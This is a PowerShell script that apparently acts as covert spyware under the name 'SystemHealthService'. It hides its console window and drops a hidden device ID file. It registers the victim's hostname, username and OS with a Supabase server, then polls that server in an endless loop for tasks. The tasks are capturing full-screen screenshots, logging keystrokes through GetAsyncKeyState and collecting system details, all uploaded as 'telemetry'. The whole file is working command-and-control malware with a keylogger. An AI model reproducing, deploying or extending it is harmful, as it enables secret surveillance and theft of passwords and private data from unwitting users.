$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
[C.W]::ShowWindow([C.W]::GetConsoleWindow(), 0)
$basePath = "$env:APPDATA\SystemHealthService"
$config = Get-Content "$basePath\config.json" -Raw | ConvertFrom-Json
$idFile = "$basePath\device_id.txt"
if (Test-Path $idFile) { $deviceId = Get-Content $idFile } 
else { $deviceId = [guid]::NewGuid().ToString(); $deviceId | Out-File $idFile; (Get-Item $idFile).Attributes = "Hidden" }
$deviceName = -join ((65..90)+(97..122) | Get-Random -Count 8 | %{[char]$_})
$headers = @{ "apikey" = $config.supabase_key; "Authorization" = "Bearer $($config.supabase_key)"; "Content-Type" = "application/json"; "Prefer" = "return=minimal" }
function Invoke-Supa { param($endpoint, $method = "GET", $body = $null)
    $uri = "$($config.supabase_url)/rest/v1/$endpoint"
    if ($body) { Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -Body ($body | ConvertTo-Json -Depth 5) }
    else { Invoke-RestMethod -Uri $uri -Method $method -Headers $headers }
}
$reg = @{ device_id = $deviceId; device_name = $deviceName; hostname = $env:COMPUTERNAME; username = $env:USERNAME; os_info = (Get-WmiObject Win32_OperatingSystem).Caption }
try { Invoke-Supa -endpoint "devices" -method "POST" -body $reg } catch {}
function Capture-Display {
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $b = New-Object System.Drawing.Bitmap $s.Width, $s.Height
    $g = [System.Drawing.Graphics]::FromImage($b)
    $g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size)
    $m = New-Object System.IO.MemoryStream; $b.Save($m, [System.Drawing.Imaging.ImageFormat]::Png)
    $r = [Convert]::ToBase64String($m.ToArray()); $g.Dispose(); $b.Dispose(); $m.Dispose()
    return $r
}
$global:buf = @()
function Capture-Input { param($dur)
    $a = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);' -Name I -Namespace W -PassThru
    $end = (Get-Date).AddSeconds($dur)
    while ((Get-Date) -lt $end) { Start-Sleep -Milliseconds 10
        for ($i=8; $i -le 190; $i++) { if ($a::GetAsyncKeyState($i) -eq -32767) { $global:buf += [System.Windows.Forms.Keys]$i } }
    }
    $r = $global:buf -join ""; $global:buf = @(); return $r
}
while ($true) {
    try {
        Invoke-Supa -endpoint "devices?device_id=eq.$deviceId" -method "PATCH" -body @{ last_sync = (Get-Date -Format "o") }
        $tasks = Invoke-Supa -endpoint "tasks?device_id=eq.$deviceId&status=eq.pending&select=id,task_type,task_params"
        foreach ($t in $tasks) {
            $result = switch ($t.task_type) {
                "display_capture" { @{ data_type = "display"; file_data = Capture-Display } }
                "input_monitor" { @{ data_type = "input"; data = Capture-Input -dur ($t.task_params.duration ?? 60) } }
                "system_info" { @{ data_type = "sysinfo"; data = (@{ hostname=$env:COMPUTERNAME; username=$env:USERNAME; os=(Get-WmiObject Win32_OperatingSystem).Caption } | ConvertTo-Json) } }
            }
            if ($result) {
                $result.device_id = $deviceId
                Invoke-Supa -endpoint "telemetry" -method "POST" -body $result
                Invoke-Supa -endpoint "tasks?id=eq.$($t.id)" -method "PATCH" -body @{ status = "complete"; completed_at = (Get-Date -Format "o") }
            }
        }
        Start-Sleep $config.sync_interval
    } catch { Start-Sleep $config.retry_interval }
}